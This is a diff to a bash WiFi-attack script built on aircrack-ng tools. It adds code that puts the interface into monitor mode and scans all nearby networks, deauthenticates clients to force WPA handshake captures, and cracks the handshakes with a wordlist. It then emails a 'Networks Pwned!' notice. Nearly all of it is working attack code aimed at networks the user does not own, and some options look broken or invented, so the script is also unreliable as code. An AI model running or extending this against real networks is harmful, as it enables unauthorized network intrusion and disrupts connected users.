@@ -270,6 +270,7 @@ echo -e "[${Green}${foo}${White}] Sending DeAuth to target..."
 xterm -e aireplay-ng --deauth 20 -a $bssid $foo
 echo -e "[${Green}Status${White}] Checking for Handshake Packet..."
 check_cap_files
+crack
 }
 
 wordlist () {        ##### Enter path to wordlist or use default #####
@@ -315,20 +316,114 @@ echo "Enter your email address for notifications: " email
 read email
 sleep 3
 echo "Remeber to check your spam folder!"
-network
-sudo besside-ng $foo
-check_cap_files
-sleep 10
+# Put interface into monitor mode
+airmon-ng start $foo
+
+# Initialize an empty list to store the BSSIDs of nearby networks
+bssids=()
+
+# Scan for nearby wireless networks
+airodump-ng $foo --channel 1-14 --write-interval 1 --output-format csv - 2>&1 | while read line; do
+  # Extract the BSSID from the line
+  bssid=$(echo "$line" | cut -d',' -f1)
+
+  # Check if the BSSID is already in the list
+  if [[ ! " ${bssids[@]} " =~ " ${bssid} " ]]; then
+    # Add the BSSID to the list
+    bssids+=($bssid)
+
+    # Capture the handshake for this network
+    airodump-ng -c 1-14 --bssid $bssid --wpa-handshake $bssid-handshake.txt --write-interval 1 $foo &
+  fi
+done
+
+# Wait for all handshakes to be captured
+while true; do
+  # Check if all handshakes have been captured
+  all_handshakes_captured=true
+  for bssid in "${bssids[@]}"; do
+    if [ ! -s "$bssid-handshake.txt" ]; then
+      all_handshakes_captured=false
+      break
+    fi
+  done
+
+  # If all handshakes have been captured, stop
+  if $all_handshakes_captured; then
+    # Stop all airodump-ng processes
+    pkill -INT airodump-ng
+    break
+  fi
+
+  # Sleep for 1 second before checking again
+  sleep 1
+done
+
+# Perform dictionary attack on captured handshakes
+#for bssid in "${bssids[@]}"; do
+#  aircrack-ng -w wordlist.txt -b $bssid-handshake.txt
+#done
+stopMon
+# Print a success message
+echo "WPA Handshake(s) Captured Successfully!"
 echo "Handshakes have been captured!" | mail -s "Networks Pwned!" $email
+#crack
 }
 
 
 attackAllNo () {
-network
-sudo besside-ng $foo
-check_cap_files
+airmon-ng start $foo
 
+# Initialize an empty list to store the BSSIDs of nearby networks
+bssids=()
+
+# Scan for nearby wireless networks
+airodump-ng $foo --channel 1-14 --write-interval 1 --output-format csv - 2>&1 | while read line; do
+  # Extract the BSSID from the line
+  bssid=$(echo "$line" | cut -d',' -f1)
+
+  # Check if the BSSID is already in the list
+  if [[ ! " ${bssids[@]} " =~ " ${bssid} " ]]; then
+    # Add the BSSID to the list
+    bssids+=($bssid)
+
+    # Capture the handshake for this network
+    airodump-ng -c 1-14 --bssid $bssid --wpa-handshake $bssid-handshake.txt --write-interval 1 $foo &
+  fi
+done
+
+# Wait for all handshakes to be captured
+while true; do
+  # Check if all handshakes have been captured
+  all_handshakes_captured=true
+  for bssid in "${bssids[@]}"; do
+    if [ ! -s "$bssid-handshake.txt" ]; then
+      all_handshakes_captured=false
+      break
+    fi
+  done
+
+  # If all handshakes have been captured, stop
+  if $all_handshakes_captured; then
+    # Stop all airodump-ng processes
+    pkill -INT airodump-ng
+    break
+  fi
+
+  # Sleep for 1 second before checking again
+  sleep 1
+done
+
+# Perform dictionary attack on captured handshakes
+#for bssid in "${bssids[@]}"; do
+#  aircrack-ng -w wordlist.txt -b $bssid-handshake.txt
+#done
+stopMon
+# Print a success message
+echo "WPA Handshake(s) Captured Successfully!"
+#crack
 }
+
 
 
 
@@ -350,13 +445,15 @@ cd wifite2
 sudo ./Wifite.py
 }
 
+
 crack () {
 echo "Your current directory:"
 pwd
 ls *.txt
 read -p "Enter path to wordlist : " wordlist
- $wordlist
-sudo aircrack-ng -w $wordlist *.cap
+$wordlist
+sudo aircrack-ng -w $wordlist *.cap 
+#sudo aircrack-ng -w wordlist.txt -b *.cap
 #sudo aircrack-ng -w $wordlist wep.cap
 #sudo aircrack-ng -w $wordlist wpa.cap
 #sudo aircrack-ng -w wordlist.txt wep.cap
@@ -672,7 +769,7 @@ check_cap_files() {
                 sudo airmon-ng stop wlan0mon > /dev/null 2>&1
                 sudo airmon-ng stop wlp7s0mon > /dev/null 2>&1
                 sudo systemctl start NetworkManager > /dev/null 2>&1
-
+                echo "Handshakes have been captured!" | mail -s "Networks Pwned!" $email > /dev/null 2>&1
                 # Now proceed with cracking
                 crack "$cap_file"  # Assuming 'crack' is a function that accepts the file
                 return 0  # Stop after finding a valid file with EAPOL
@@ -697,59 +794,121 @@ deauthAttack () {
 sudo rm -rf *.cap
 sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake $foo > /dev/null &
 recon
+# Ensure recon is done and client was found before proceeding to the next steps
+if [ "$client_found" = true ]; then
+    sleep 4
 xterm -e aireplay-ng -0 50 -a $bssid -c $client $foo
 sleep 2
 check_cap_files
+    echo -e "\e[32m[Proceeding with next steps]\e[0m"
+else
+    echo -e "\e[31m[Recon failed to find a client, aborting subsequent steps.]\e[0m"
+    exit 1
+fi
  } 
 
 
 
-# Function to perform client MAC capture and file handling
 recon() {
-    echo -e "\e[32m[Scanning for clients...]\e[0m"  # Green text for scanning message
+    retries=0
+    max_retries=5  # Define the number of retries
+    client_found=false  # Flag to check if client is found
 
-    # Start airodump-ng in a separate terminal window using xterm
-    xterm -hold -e "sudo airodump-ng --bssid $bssid --channel $channel --output-format csv --write client $foo && sleep 30 && exit" &
+    while [ $retries -lt $max_retries ]; do
+        echo -e "\e[32m[Scanning for clients...]\e[0m"  # Green text for scanning message
 
-    # Allow 30 seconds for the capture file to populate
-    echo "Waiting for 30 seconds for airodump to capture data..."
-    sleep 30
+        # Start airodump-ng with sudo for permission
+        xterm -hold -e "sudo airodump-ng --bssid $bssid --channel $channel --output-format csv --write client $foo && sleep 60 && exit" &
 
-    # Check if the capture CSV file exists and contains data
-    if [ ! -f "client-01.csv" ]; then
-        echo -e "\e[31mError: client-01.csv not found. Airodump-ng may not have captured any data.\e[0m"
-        return 1
+        # Allow 60 seconds for the capture file to populate (increased wait time)
+        echo "Waiting for 60 seconds for airodump to capture data..."
+        sleep 60
+
+        # Check if the capture CSV file exists and contains data
+        if [ ! -f "client-01.csv" ]; then
+            echo -e "\e[31mError: client-01.csv not found. Airodump-ng may not have captured any data.\e[0m"
+            retries=$((retries + 1))
+            echo -e "\e[31m[Retrying... ($retries/$max_retries)]\e[0m"
+            sleep 5  # Delay before retrying
+            continue
+        fi
+
+        # Remove lines that match the BSSID from the client-01.csv file and save to a temporary file using awk
+        echo -e "\e[32m[Filtering out BSSID from client-01.csv...]\e[0m"
+        awk -F',' -v bssid="$bssid" '
+        BEGIN {
+            print_header = 1
+        }
+        {
+            if (print_header) {
+                print $0
+                print_header = 0
+            } else if ($1 != bssid && $1 != "Station MAC" && $1 != "" && length($1) == 17) {
+                print $0
+            }
+        }' client-01.csv > client_filtered.csv
+
+        # Extract the client MAC addresses from the filtered CSV file
+        echo -e "\e[32m[Client MAC addresses found in client_filtered.csv]:\e[0m"
+        
+        # Read through the filtered CSV file to find client MACs
+        while IFS=',' read -r station_mac first_time last_time power packet_count bssid probed_essid; do
+            # Skip the header or rows with empty station_mac, and ensure it's not the BSSID
+            if [[ -n "$station_mac" && "$station_mac" != "Station MAC" && "$station_mac" != "$first_time" && "$station_mac" != "$bssid" && "${#station_mac}" == 17 ]]; then
+                client=$station_mac  # Correctly assign to $client
+                client_found=true
+                echo -e "\e[32m[Client found: $client]\e[0m"  # Green text for client found
+                break
+            fi
+        done < <(tail -n +2 client_filtered.csv)  # Skip header row using tail
+
+        # If client found, break out of the retry loop
+        if [ "$client_found" = true ]; then
+            break  # Exit the loop after client is found
+        else
+            retries=$((retries + 1))
+            echo -e "\e[31m[Retrying... ($retries/$max_retries)]\e[0m"
+            sleep 5  # Delay before retrying
+        fi
+    done
+
+    # If no client is found after max retries, exit with an error
+    if [ "$client_found" = false ]; then
+        echo -e "\e[31m[Failed to capture client after $max_retries retries. Exiting...]\e[0m"
+        rm client_filtered.csv
+        exit 1
     fi
 
-    # Extract the client MAC addresses from the CSV file, skipping the BSSID
-    echo -e "\e[32m[Client MAC addresses found in client-01.csv]:\e[0m"
-    
-    client_found=false
-    # Read through the CSV file to find client MACs (excluding the BSSID)
-    while IFS=',' read -r station_mac first_time last_time power packet_count bssid probed_essid; do
-        # Skip the header or rows where station MAC equals the BSSID
-        if [[ "$station_mac" != "$bssid" && -n "$station_mac" && "$station_mac" != "Station MAC" && "$station_mac" != "$first_time" ]]; then
-            client=$station_mac  # Correctly assign to $client
-            client_found=true
-            echo -e "\e[32m[Client found: $client]\e[0m"  # Green text for client found
-            break
-        fi
-    done < <(tail -n +2 client-01.csv)  # Skip header row using tail
-    
-    # If no client MAC is found
-    if [ "$client_found" = false ]; then
-        echo -e "\e[31m[Client not found]\e[0m"  # Red text for client not found
-    else
-        # Check if the .cap file exists and rename it
-        if [ -f "client-01.cap" ]; then
-            mv client-01.cap client.cap
+    # Now handle the .cap file
+    echo "Waiting for capture file to be available..."
+
+    # Check for any .cap file in the directory (not just client-01.cap)
+    for ((i=0; i<5; i++)); do
+        # List files in the directory for debugging
+        echo "Listing .cap files in the directory..."
+        ls *.cap
+
+        # Check if any .cap file exists
+        if ls *.cap 1> /dev/null 2>&1; then
+            # Move the first .cap file found
+            cap_file=$(ls *.cap | head -n 1)
+            sudo mv "$cap_file" client.cap
             echo -e "\e[32m[Capture file renamed to client.cap]\e[0m"
+            break
         else
-            echo -e "\e[31mError: client-01.cap file not found to rename.\e[0m"
+            echo "Capture file not found, retrying... ($((i+1))/5)"
+            sleep 3  # Delay before retrying
         fi
+    done
+
+    # Check if the file was successfully renamed
+    if [ -f "client.cap" ]; then
+        echo -e "\e[32m[Capture file successfully renamed.]\e[0m"
+    else
+        echo -e "\e[31m[Error: .cap file not found after retries.]\e[0m"
+        exit 1
     fi
 }
-
 
 
 macChange() {
